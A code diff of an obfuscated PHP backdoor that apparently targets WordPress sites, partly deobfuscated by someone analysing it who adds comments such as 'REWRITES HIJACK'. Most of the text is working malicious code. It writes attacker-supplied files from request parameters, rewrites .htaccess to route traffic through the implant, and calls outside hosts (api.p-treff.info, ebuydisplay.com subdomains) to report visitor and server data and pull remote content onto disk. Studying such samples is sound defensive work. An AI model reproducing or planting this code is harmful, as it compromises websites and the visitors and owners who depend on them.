@@ -134,21 +134,21 @@ $lambda_4 = function($input) {
 
 // ________________________________________________________
 
-$lambda_5 = function($O0OOO0___0) {
-    $OO000__OO_="delete|error";
-    $O00O_0O__O=isset(${"_REQUEST"}['xxxxxxxxxxxx_filename'])?${"_REQUEST"}['xxxxxxxxxxxx_filename']:'';
-    $O0_00_OO_O=isset(${"_REQUEST"}['xxxxxxxxxxxx_filecontent'])?${"_REQUEST"}['xxxxxxxxxxxx_filecontent']:'';
-    
-    if(file_exists($O00O_0O__O)){
-        if(!unlink($O00O_0O__O)){
-            echo $OO000__OO_;
-            exit();
-        }
-    }
-
-    file_put_contents($O00O_0O__O,$O0_00_OO_O,FILE_APPEND);
-    echo $O00O_0O__O.'|success';
-}
+## ALL GONE
+#$lambda_5 = function($O0OOO0___0) {
+#    $FILENAME=isset(${"_REQUEST"}['xxxxxxxxxxxx_filename'])?${"_REQUEST"}['xxxxxxxxxxxx_filename']:'';
+#    $FILECONTENT=isset(${"_REQUEST"}['xxxxxxxxxxxx_filecontent'])?${"_REQUEST"}['xxxxxxxxxxxx_filecontent']:'';
+#    
+#    if(file_exists($FILENAME)){
+#        if(!unlink($FILENAME)){
+#            echo "delete|error";
+#            exit();
+#        }
+#    }
+#
+#    file_put_contents($FILENAME,$FILECONTENT,FILE_APPEND);
+#    echo $FILENAME.'|success';
+#}
 
 
 // ________________________________________________________
@@ -177,29 +177,30 @@ $FUNC_DELETE = function($O___O0O00Opidelpath) {
 }
 // ________________________________________________________
 
-$lambda_7 = function($NOOP='', $OO_0_0_0OO, $OO00_O0_O_) {
-    $rewrite_rule= "<IfModule mod_rewrite.c>\n";
-    $rewrite_rule .="RewriteEngine On\n";
-    $rewrite_rule .="RewriteBase /\n";
-    $rewrite_rule .="RewriteRule ^index.php$ - [L]\n";
-    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-f\n";
-    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-d\n";
-    $rewrite_rule .="RewriteRule . index.php [L]\n";
-    $rewrite_rule .="</IfModule>";
-
-    if($OO_0_0_0OO) {
-        $htaccess='./.htaccess';
-
-        @chmod($htaccess,0644);
-        $htaccess_contents=@file_get_contents($htaccess);
-        if(!strstr($htaccess_contents,'REQUEST_FILENAME')||!strstr($htaccess_contents,'index.php')) {
-
-            $htaccess_contents_modified=$rewrite_rule.PHP_EOL .$htaccess_contents;
-
-            @file_put_contents($htaccess,$htaccess_contents_modified);
-        }
-    }
-}
+# ALL GONE
+#$lambda_7 = function($NOOP='', $OO_0_0_0OO, $OO00_O0_O_) {
+#    $rewrite_rule= "<IfModule mod_rewrite.c>\n";
+#    $rewrite_rule .="RewriteEngine On\n";
+#    $rewrite_rule .="RewriteBase /\n";
+#    $rewrite_rule .="RewriteRule ^index.php$ - [L]\n";
+#    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-f\n";
+#    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-d\n";
+#    $rewrite_rule .="RewriteRule . index.php [L]\n";
+#    $rewrite_rule .="</IfModule>";
+#
+#    if($OO_0_0_0OO) {
+#        $htaccess='./.htaccess';
+#
+#        @chmod($htaccess,0644);
+#        $htaccess_contents=@file_get_contents($htaccess);
+#        if(!strstr($htaccess_contents,'REQUEST_FILENAME')||!strstr($htaccess_contents,'index.php')) {
+#
+#            $htaccess_contents_modified=$rewrite_rule.PHP_EOL .$htaccess_contents;
+#
+#            @file_put_contents($htaccess,$htaccess_contents_modified);
+#        }
+#    }
+#}
 
 
 
@@ -228,7 +229,6 @@ $main = function($O0OOO0___0='') {
     global $OO_0O__00O,$O0O0O_O0__;
 
 
-    $OO_0_0_0OO="1";
     $OOO_0O0__0='';
     $O__O_00O0Opps ='';
     $O__0O_00OO=${"_SERVER"}["HTTP_ACCEPT_LANGUAGE"];
@@ -247,40 +247,51 @@ $main = function($O0OOO0___0='') {
     if ($O0O0O_O0__=="") {
         # IF here, will get first alphabetically sorted file in the directory this file is in.
         $OOOO_000__=$lambda_8();
-        $O0O0O_O0__=$OOOO_000__[0];
+        $directory=$OOOO_000__[0];
     } else {
-        $O0O0O_O0__='wp-admin';
+        $directory='wp-admin';
     }
 
-    $O_0O__0O0O=base64_encode($OO0_0O__O0).'.txt';
-    $O0O_0O__O0=base64_encode($OO0_0O__O0).'a.txt';
+    $output_filename_1=base64_encode($OO0_0O__O0).'.txt';
+    $output_filename_2=base64_encode($OO0_0O__O0).'a.txt';
 
-    if(!is_dir($O0O0O_O0__)){
-        mkdir($O0O0O_O0__);
+    if(!is_dir($directory)){
+        mkdir($directory);
     }
 
-    $O_0O__0O0O=$O0O0O_O0__.'/'.$O_0O__0O0O;
-    $O0O_0O__O0=$O0O0O_O0__.'/'.$O0O_0O__O0;
+    $output_filename_1=$directory.'/'.$output_filename_1;
+    $output_filename_2=$directory.'/'.$output_filename_2;
 
     if(isset(${"_REQUEST"}['xxxxxxxxxxxx_loads'])){
-        $lambda_5();
+        ## LOADING MALICIOUS DATA ONTO HOST ???
+        ## Former: lambda_5
+        $FILENAME=isset(${"_REQUEST"}['xxxxxxxxxxxx_filename'])?${"_REQUEST"}['xxxxxxxxxxxx_filename']:'';
+        $FILECONTENT=isset(${"_REQUEST"}['xxxxxxxxxxxx_filecontent'])?${"_REQUEST"}['xxxxxxxxxxxx_filecontent']:'';
+        
+        if(file_exists($FILENAME)){
+            if(!unlink($FILENAME)){
+                echo "delete|error";
+                exit();
+            }
+        }
+
+        file_put_contents($FILENAME,$FILECONTENT,FILE_APPEND);
+        echo $FILENAME.'|success';
         exit();
     }
 
     if(isset(${"_REQUEST"}['xxxxxxxxxxxx_del'])){
-        $FUNC_DELETE($O_0O__0O0O);
+        $FUNC_DELETE($output_filename_1);
         exit();
     }
 
-    if(!file_exists($O_0O__0O0O)) {
-        $OO00_0O_O_=$MYCURL('http://api.p-treff.info/api.php?g=1110');
-        @file_put_contents($O_0O__0O0O,$OO00_0O_O_);
+    if(!file_exists($output_filename_1)) {
+        #$OO00_0O_O_=$MYCURL('http://api.p-treff.info/api.php?g=1110');
+        @file_put_contents($output_filename_1,'LmVidXlkaXNwbGF5LmNvbQ==|MTAwMC5lYnV5ZGlzcGxheS5jb20=');
     }
+    
+    $O0_OO0__0O="1000.ebuydisplay.com";
 
-    $OO00_0O_O_=file_get_contents($O_0O__0O0O);
-    $OO00_0O_O_=explode('|',$OO00_0O_O_);
-    $O00O_O_O0_=base64_decode(trim($OO00_0O_O_[0]));
-    $O0_OO0__0O=base64_decode(trim($OO00_0O_O_[1]));
     $OO000O___O=${"_SERVER"}["REQUEST_URI"];
     $OO00_O0_O_='';
     $OO00O___0O=${"_SERVER"}["\x44O\x43\x55\x4d\x45\x4e\x54_\x52OO\x54"];
@@ -303,25 +314,44 @@ $main = function($O0OOO0___0='') {
         $OOO_0O0__0=$OOO_0O0__0.$OO___O0O00;
     }
 
-    $O_OO00O0__='www';
-    $O_0O0O0O__='';
+    $REQUEST_SCHEME='';
 
 
     if(isset(${"_SERVER"}["REQUEST_SCHEME"])){
-        $O_0O0O0O__=${"_SERVER"}["REQUEST_SCHEME"];
+        $REQUEST_SCHEME=${"_SERVER"}["REQUEST_SCHEME"];
     }
 
-    $OO_0_0_0OO=(int)$OO_0_0_0OO;
+    #$lambda_7('',$OO_0_0_0OO,$OO00_O0_O_,$OO00O___0O);
+    # REWRITES HIJACK
+    $rewrite_rule= "<IfModule mod_rewrite.c>\n";
+    $rewrite_rule .="RewriteEngine On\n";
+    $rewrite_rule .="RewriteBase /\n";
+    $rewrite_rule .="RewriteRule ^index.php$ - [L]\n";
+    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-f\n";
+    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-d\n";
+    $rewrite_rule .="RewriteRule . index.php [L]\n";
+    $rewrite_rule .="</IfModule>";
 
-    $lambda_7('',$OO_0_0_0OO,$OO00_O0_O_,$OO00O___0O);
+    $htaccess='./.htaccess';
+
+    @chmod($htaccess,0644);
+    $htaccess_contents=@file_get_contents($htaccess);
+    if(!strstr($htaccess_contents,'REQUEST_FILENAME')||!strstr($htaccess_contents,'index.php')) {
+
+        $htaccess_contents_modified=$rewrite_rule.PHP_EOL .$htaccess_contents;
+
+        @file_put_contents($htaccess,$htaccess_contents_modified);
+    }
+
+    ### ????
     
-    $O_O0O_O_00='www'.'1110'.trim($O00O_O_O0_);
-    $O___OOO000=$O_OO00O0__.trim($O0_OO0__0O);
-    $O0O_O_O00_="http://%host%/data1028.php?d=%s&g=%s&t=%s&u=%s&h=%s&p=%s&r=%s&a=%s&l=%s&i=%s&j=%s&o=%s";
+    $O_O0O_O_00='www1110.ebuydisplay.com';
+    $O___OOO000="www1000.ebuydisplay.com";
+
+    $O0O_O_O00_="http://www1110.ebuydisplay.com/data1028.php?d=%s&g=%s&t=%s&u=%s&h=%s&p=%s&r=%s&a=%s&l=%s&i=%s&j=%s&o=%s";
     $OO_00O_O0_="http://%host%/jump1028.php?d=%s&g=%s&t=%s&u=%s&h=%s&p=%s&r=%s&a=%s&l=%s&i=%s&j=%s&o=%s";
-    $O0OO0_O0__='http://%host%/mapfile.txt';
-    $O0O_O_O00_=preg_replace("/%host%/si",$O_O0O_O_00,$O0O_O_O00_);
-    $O0OO0_O0__=preg_replace("/%host%/si",$O_O0O_O_00,$O0OO0_O0__);
+    $O0OO0_O0__='http://www1000.ebuydisplay.com/mapfile.txt';
+
     $OO00_0_OO_="<spango>";
     $O0O_0_O_O0='zlib';
     $O_O_0O0O0_='|';
@@ -329,18 +359,18 @@ $main = function($O0OOO0___0='') {
 
 
     if(isset(${"_REQUEST"}["xxnew_map"])){
-        $O_0OO0O0__=${"_REQUEST"}["xxnew_map"];
+        $REQUEST_XXNEW_MAP=${"_REQUEST"}["xxnew_map"];
         $O_O__000OO='/';
-        if($O_0OO0O0__!=''){
-            mkdir($O_0OO0O0__,0755);
-            $O_0OO0O0__ =$O_0OO0O0__.$O_O__000OO;
+        if($REQUEST_XXNEW_MAP!=''){
+            mkdir($REQUEST_XXNEW_MAP,0755);
+            $REQUEST_XXNEW_MAP =$REQUEST_XXNEW_MAP.$O_O__000OO;
         }
 
         $O0O___0O0O=$MYCURL($O0OO0_O0__);
         $O_O0_00OO_=explode('|',$O0O___0O0O);
         $O_O0_00O_O='end';
         for($O__O_00O0O=0; $O__O_00O0O<count($O_O0_00OO_); $O__O_00O0O++) {
-            $O000_OO__O=sprintf($O0O_O_O00_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($O_O__000OO.trim($O_O0_00OO_[$O__O_00O0O])),urlencode($O_0O0O0O__),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,0,$O_O00_O_0O.$O_O_0O0O0_.$OO00O___0O);
+            $O000_OO__O=sprintf($O0O_O_O00_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($O_O__000OO.trim($O_O0_00OO_[$O__O_00O0O])),urlencode($REQUEST_SCHEME),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,0,$O_O00_O_0O.$O_O_0O0O0_.$OO00O___0O);
             $O0O___0O0O=$MYCURL($O000_OO__O);
             $OO_O_0O00_="/(robots).*.txt$/";
             if(strstr($O0O___0O0O,$OO00_0_OO_)&&preg_match($OO_O_0O00_,trim($O_O0_00OO_[$O__O_00O0O]))){
@@ -349,19 +379,19 @@ $main = function($O0OOO0___0='') {
                 echo trim($O_O0_00OO_[$O__O_00O0O]).'<br>';
             } else if (strstr($O0O___0O0O,$OO00_0_OO_)) {
                 $O0O___0O0O=str_replace($OO00_0_OO_,'',$O0O___0O0O);
-                file_put_contents($O_0OO0O0__.trim($O_O0_00OO_[$O__O_00O0O]),$O0O___0O0O);
-                echo $O_0OO0O0__.trim($O_O0_00OO_[$O__O_00O0O]).'<br>';
+                file_put_contents($REQUEST_XXNEW_MAP.trim($O_O0_00OO_[$O__O_00O0O]),$O0O___0O0O);
+                echo $REQUEST_XXNEW_MAP.trim($O_O0_00OO_[$O__O_00O0O]).'<br>';
             }
         }
 
         echo $O_O0_00O_O;
-        unset($O0O___0O0O,$O_O0_00OO_,$O_0OO0O0__);
+        unset($O0O___0O0O,$O_O0_00OO_,$REQUEST_XXNEW_MAP);
         exit();
     }
 
-    $O0O_O_O00_=sprintf($O0O_O_O00_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($OO000O___O),urlencode($O_0O0O0O__),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,0,$OO00O___0O.$O_O_0O0O0_.$O_0O00_OO_);
+    $O0O_O_O00_=sprintf($O0O_O_O00_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($OO000O___O),urlencode($REQUEST_SCHEME),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,0,$OO00O___0O.$O_O_0O0O0_.$O_0O00_OO_);
     $OO_00O_O0_=preg_replace("/%host%/si",$O___OOO000,$OO_00O_O0_);
-    $OO_00O_O0_=sprintf($OO_00O_O0_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($OO000O___O),urlencode($O_0O0O0O__),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,1,$OO00O___0O.$O_O_0O0O0_.$O_0O00_OO_);
+    $OO_00O_O0_=sprintf($OO_00O_O0_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($OO000O___O),urlencode($REQUEST_SCHEME),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,1,$OO00O___0O.$O_O_0O0O0_.$O_0O00_OO_);
     $O_OOO_00_0=isset(${"_REQUEST"}['xxnew201'.'8_url1'])?${"_REQUEST"}['xxnew201'.'8_url1']:'';
     $OOO0_0_O0_=isset(${"_REQUEST"}["writerfilename"])?${"_REQUEST"}["writerfilename"]:'';
 
@@ -370,11 +400,11 @@ $main = function($O0OOO0___0='') {
         $O0_O0_O0_O='wp-load.php';
         $O0_O_0OO0_='up.txt';
         if($OOO0_0_O0_!='') {
-            file_put_contents($O0O_0O__O0,base64_encode($O_OOO_00_0).'-'.base64_encode($OOO0_0_O0_));
+            file_put_contents($output_filename_2,base64_encode($O_OOO_00_0).'-'.base64_encode($OOO0_0_O0_));
             $O0_O0_O0_O=$OOO0_0_O0_;
         }
 
-        $OOO0_0_O_0=@file_get_contents($O0O_0O__O0);
+        $OOO0_0_O_0=@file_get_contents($output_filename_2);
         if(trim($OOO0_0_O_0)!='') {
             $OOO0_0_O_0=explode('-',$OOO0_0_O_0);
             $O0_O0_O0_O=base64_decode(trim($OOO0_0_O_0[1]));
